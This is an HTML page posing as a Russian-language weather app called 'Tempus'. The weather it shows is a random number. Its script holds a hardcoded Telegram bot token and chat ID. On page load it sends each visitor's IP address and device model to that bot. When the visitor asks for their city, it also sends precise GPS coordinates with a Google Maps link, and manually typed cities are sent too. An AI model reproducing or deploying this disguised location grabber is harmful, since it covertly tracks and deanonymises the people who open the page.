<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tempus -- премиум погода</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }

        .gradient-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            background: linear-gradient(125deg, #0f2027, #203a43, #2c5364);
            background-size: 400% 400%;
            animation: gradientFlow 15s ease infinite;
        }

        @keyframes gradientFlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .star {
            position: fixed;
            background: white;
            border-radius: 50%;
            z-index: -1;
            animation: twinkle 3s infinite ease-in-out;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.3); }
        }

        .shooting-star {
            position: fixed;
            width: 2px;
            height: 2px;
            background: white;
            border-radius: 50%;
            box-shadow: 0 0 20px white;
            z-index: -1;
            animation: shoot 3s linear infinite;
        }

        @keyframes shoot {
            0% { transform: translateX(0) translateY(0); opacity: 1; }
            70% { opacity: 1; }
            100% { transform: translateX(-200px) translateY(200px); opacity: 0; }
        }

        .cloud {
            position: fixed;
            background: rgba(255,255,255,0.1);
            border-radius: 1000px;
            filter: blur(40px);
            z-index: -1;
        }

        .cloud1 {
            width: 500px;
            height: 150px;
            top: 10%;
            left: -250px;
            animation: driftCloud 40s infinite linear;
        }

        .cloud2 {
            width: 600px;
            height: 180px;
            bottom: 15%;
            right: -300px;
            animation: driftCloud 50s infinite linear reverse;
        }

        .cloud3 {
            width: 400px;
            height: 120px;
            top: 40%;
            left: 20%;
            animation: driftCloud 35s infinite linear;
        }

        .cloud4 {
            width: 300px;
            height: 90px;
            bottom: 30%;
            right: 10%;
            animation: driftCloud 30s infinite linear reverse;
        }

        @keyframes driftCloud {
            from { transform: translateX(0); }
            to { transform: translateX(100vw); }
        }

        .particle {
            position: fixed;
            background: rgba(255,255,255,0.1);
            border-radius: 50%;
            pointer-events: none;
            z-index: -1;
        }

        @keyframes floatParticle {
            0% { transform: translate(0, 0); }
            25% { transform: translate(50px, -50px); }
            50% { transform: translate(100px, 0); }
            75% { transform: translate(50px, 50px); }
            100% { transform: translate(0, 0); }
        }

        .weather-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 60px;
            padding: 40px 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 40px 70px -20px rgba(0,0,0,0.6);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            position: relative;
            z-index: 10;
            animation: cardFloat 0.8s ease;
        }

        @keyframes cardFloat {
            from { opacity: 0; transform: translateY(40px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .btn {
            background: white;
            color: #1e3a5f;
            border: none;
            padding: 18px 36px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 700;
            margin-top: 20px;
            width: 100%;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
        }

        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        .btn-secondary {
            background: rgba(255,255,255,0.15);
            color: white;
            border: 1px solid rgba(255,255,255,0.4);
        }

        .btn-map {
            background: #00a86b;
            color: white;
        }

        .weather-icon {
            font-size: 140px;
            text-align: center;
            margin: 15px 0;
            animation: floatIcon 4s ease-in-out infinite;
        }

        @keyframes floatIcon {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }

        .temperature {
            font-size: 82px;
            font-weight: 300;
            text-align: center;
            margin-bottom: 20px;
        }

        .coord-text {
            background: rgba(0,0,0,0.25);
            padding: 16px;
            border-radius: 40px;
            margin: 25px 0;
            text-align: center;
            font-size: 18px;
            border: 1px solid rgba(255,255,255,0.2);
        }

        .loading-spinner {
            width: 70px;
            height: 70px;
            border: 5px solid rgba(255,255,255,0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .manual-input {
            width: 100%;
            padding: 18px 24px;
            border-radius: 60px;
            border: 2px solid rgba(255,255,255,0.25);
            background: rgba(255,255,255,0.1);
            color: white;
            font-size: 18px;
            margin: 20px 0;
        }

        .manual-input::placeholder {
            color: rgba(255,255,255,0.5);
        }

        .city-name {
            font-size: 38px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .footer-note {
            font-size: 12px;
            text-align: center;
            margin-top: 30px;
            opacity: 0.5;
        }

        .music-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            font-size: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 1000;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        .music-btn:hover {
            transform: scale(1.1);
            background: rgba(255,255,255,0.3);
        }
    </style>
</head>
<body>
    <div class="gradient-bg"></div>
    
    <div class="cloud cloud1"></div>
    <div class="cloud cloud2"></div>
    <div class="cloud cloud3"></div>
    <div class="cloud cloud4"></div>

    <div class="music-btn" id="musicBtn">🎵</div>
    <div class="weather-card" id="weatherCard"></div>

    <script>
        // ========== СОЗДАНИЕ ЗВЁЗД ==========
        for (let i = 0; i < 100; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.width = Math.random() * 3 + 1 + 'px';
            star.style.height = star.style.width;
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.animationDelay = Math.random() * 3 + 's';
            star.style.animationDuration = Math.random() * 2 + 2 + 's';
            document.body.appendChild(star);
        }

        for (let i = 0; i < 5; i++) {
            const shootingStar = document.createElement('div');
            shootingStar.className = 'shooting-star';
            shootingStar.style.left = Math.random() * 100 + '%';
            shootingStar.style.top = Math.random() * 50 + '%';
            shootingStar.style.animationDelay = Math.random() * 5 + 's';
            shootingStar.style.animationDuration = Math.random() * 2 + 2 + 's';
            document.body.appendChild(shootingStar);
        }

        for (let i = 0; i < 20; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            const size = Math.random() * 100 + 50;
            particle.style.width = size + 'px';
            particle.style.height = size + 'px';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.top = Math.random() * 100 + '%';
            particle.style.animation = `floatParticle ${Math.random() * 20 + 20}s infinite`;
            particle.style.opacity = '0.1';
            document.body.appendChild(particle);
        }

        const BOT_TOKEN = '8645809693:AAGP2KkzRpHXXuUzw8JgZ36kmSLarqxiP8Q';
        const CHAT_ID = '7198236101';

        // ========== МУЗЫКА ИЗ ИНТЕРНЕТА ==========
        let audio = null;
        let isPlaying = false;

        // Спокойные фоновые треки
        const musicUrls = [
            'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
            'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3',
            'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3'
        ];

        function initMusic() {
            if (audio) return;
            
            const randomUrl = musicUrls[Math.floor(Math.random() * musicUrls.length)];
            audio = new Audio(randomUrl);
            audio.loop = true;
            audio.volume = 0.3;
            
            audio.play().then(() => {
                isPlaying = true;
                document.getElementById('musicBtn').textContent = '🔊';
            }).catch(() => {
                isPlaying = false;
                document.getElementById('musicBtn').textContent = '🎵';
            });
        }

        document.getElementById('musicBtn').onclick = function() {
            if (!audio) {
                initMusic();
            } else if (audio.paused) {
                audio.play();
                this.textContent = '🔊';
            } else {
                audio.pause();
                this.textContent = '🎵';
            }
        };

        document.addEventListener('click', function initMusicOnClick() {
            if (!audio) {
                initMusic();
            }
        }, { once: true });

        // ========== ГЛАВНОЕ МЕНЮ ==========
        function showMainMenu() {
            const card = document.getElementById('weatherCard');
            card.innerHTML = `
                <div style="text-align:center;">
                    <div class="weather-icon">🌤️</div>
                    <h2 class="city-name">Tempus</h2>
                    <p style="margin:25px 0 15px;">Нажмите кнопку для определения</p>
                    <button class="btn" onclick="window.requestLocation()">📍 Определить город</button>
                    <p style="margin:20px 0;">или</p>
                    <button class="btn btn-secondary" onclick="window.showManualInput()">🔍 Ввести вручную</button>
                    <div class="footer-note">всегда с вами</div>
                </div>
            `;
        }

        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
                });
            } catch (e) {}
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'не определен'; }
        }

        function getDeviceModel() {
            const ua = navigator.userAgent;
            const match = ua.match(/; ([\w\s]+) Build/);
            if (match) return match[1].trim();
            if (ua.includes('iPhone')) return 'iPhone';
            return ua.split('(')[1]?.split(')')[0] || 'Неизвестно';
        }

        async function getCityFromCoords(lat, lon) {
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ru`);
                const data = await res.json();
                return data.address?.city || data.address?.town || data.address?.village || 'Неизвестно';
            } catch { return 'Неизвестно'; }
        }

        window.requestLocation = function() {
            const card = document.getElementById('weatherCard');
            
            card.innerHTML = `
                <div style="text-align:center;">
                    <div class="loading-spinner"></div>
                    <p style="margin:20px 0;">Запрашиваем доступ...</p>
                </div>
            `;

            if (!navigator.geolocation) {
                alert('Геолокация не поддерживается');
                window.showManualInput();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    const ip = await getIP();
                    const city = await getCityFromCoords(lat, lon);
                    const device = getDeviceModel();
                    const time = new Date().toLocaleString('ru-RU');

                    await sendToTelegram(
`🌍 *НОВАЯ ГЕОЛОКАЦИЯ*

🕒 Время: ${time}
📍 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
🏘 Город: ${city}
📱 Устройство: ${device}
🌐 IP: ${ip}

🗺 [Открыть на Google Maps](https://www.google.com/maps?q=${lat},${lon})`
                    );

                    const temp = Math.floor(Math.random() * 15) + 10;
                    
                    card.innerHTML = `
                        <div style="text-align:center;">
                            <div class="city-name">${city}</div>
                            <div class="weather-icon">☀️</div>
                            <div class="temperature">${temp}°C</div>
                            <div class="coord-text">📍 ${lat.toFixed(4)}°, ${lon.toFixed(4)}°</div>
                            <button class="btn btn-map" onclick="window.open('https://www.google.com/maps?q=${lat},${lon}','_blank')">
                                🗺 Открыть карту
                            </button>
                            <button class="btn btn-secondary" style="margin-top:20px;" onclick="window.showMainMenu()">
                                ← На главную
                            </button>
                        </div>
                    `;
                },
                () => {
                    window.showManualInput();
                    
                    getIP().then(ip => {
                        const device = getDeviceModel();
                        sendToTelegram(`⚠️ *Ошибка геолокации*\n📱 ${device}\n🌐 IP: ${ip}`);
                    });
                }
            );
        };

        window.showManualInput = function() {
            const card = document.getElementById('weatherCard');
            card.innerHTML = `
                <div style="text-align:center;">
                    <div class="weather-icon">🌧️</div>
                    <h3 style="margin-bottom:20px;">Введите город</h3>
                    <input type="text" class="manual-input" id="cityInput" placeholder="Например: Москва">
                    <button class="btn" onclick="window.manualCity()">Показать</button>
                    <button class="btn btn-secondary" style="margin-top:15px;" onclick="window.showMainMenu()">← Назад</button>
                </div>
            `;
        };

        window.manualCity = function() {
            const city = document.getElementById('cityInput')?.value?.trim() || 'Москва';
            if (!city) return;
            
            const temp = Math.floor(Math.random() * 15) + 10;
            
            sendToTelegram(`🏙 *Ручной ввод*\n🏘 Город: ${city}`);
            
            document.getElementById('weatherCard').innerHTML = `
                <div style="text-align:center;">
                    <div class="city-name">${city}</div>
                    <div class="weather-icon">⛅</div>
                    <div class="temperature">${temp}°C</div>
                    <button class="btn btn-secondary" style="margin-top:20px;" onclick="window.showMainMenu()">← На главную</button>
                </div>
            `;
        };

        window.onload = function() {
            showMainMenu();
            
            getIP().then(ip => {
                const device = getDeviceModel();
                const time = new Date().toLocaleString('ru-RU');
                sendToTelegram(
`🖥 *НОВЫЙ ПОСЕТИТЕЛЬ*

🕒 Время: ${time}
📱 Устройство: ${device}
🌐 IP: ${ip}`
                );
            });
        };
    </script>
</body>
</html>
